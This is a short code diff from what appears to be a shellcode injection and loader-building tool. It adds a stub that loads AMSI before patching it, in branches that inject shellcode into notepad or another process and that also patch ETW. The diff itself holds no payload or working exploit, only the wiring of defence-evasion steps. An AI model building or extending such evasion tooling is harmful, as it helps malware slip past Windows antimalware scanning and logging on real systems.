@@ -828,6 +828,7 @@ if (shellcode):
             if (remoteETWpatch):
                 stub.add(RemotePatchETWStub)
             if (remoteAMSIpatch):
+                stub.add(RemoteLoadAMSIStub)
                 stub.add(RemotePatchAMSIStub)
             stub = stub & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
         else:
@@ -835,6 +836,7 @@ if (shellcode):
             if (remoteETWpatch):
                 stub.add(RemotePatchETWStub)
             if (remoteAMSIpatch):
+                stub.add(RemoteLoadAMSIStub)
                 stub.add(RemotePatchAMSIStub)
             stub = stub & ShellcoderemoteinjectStub_customprocthird & ShellcoderemoteinjectStub
 
